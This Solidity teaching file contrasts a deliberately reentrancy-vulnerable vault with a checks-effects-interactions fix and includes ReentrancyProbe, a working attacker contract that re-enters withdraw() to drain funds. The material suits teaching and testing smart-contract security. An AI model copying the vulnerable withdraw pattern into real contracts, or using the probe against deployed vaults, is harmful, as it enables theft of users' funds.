// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// @dev Intentionally vulnerable teaching example. Never deploy with funds.
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "transfer failed");
        balances[msg.sender] = 0;
    }
}

/// @dev Teaching example using checks-effects-interactions. Not audited.
contract ChecksEffectsVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "transfer failed");
    }
}

/// @dev Example receiver that re-enters a vault while funds remain.
contract ReentrancyProbe {
    VulnerableVault public immutable vault;
    uint256 private amount;

    constructor(VulnerableVault target) {
        vault = target;
    }

    function attack() external payable {
        require(msg.value > 0, "send a deposit");
        amount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }
}
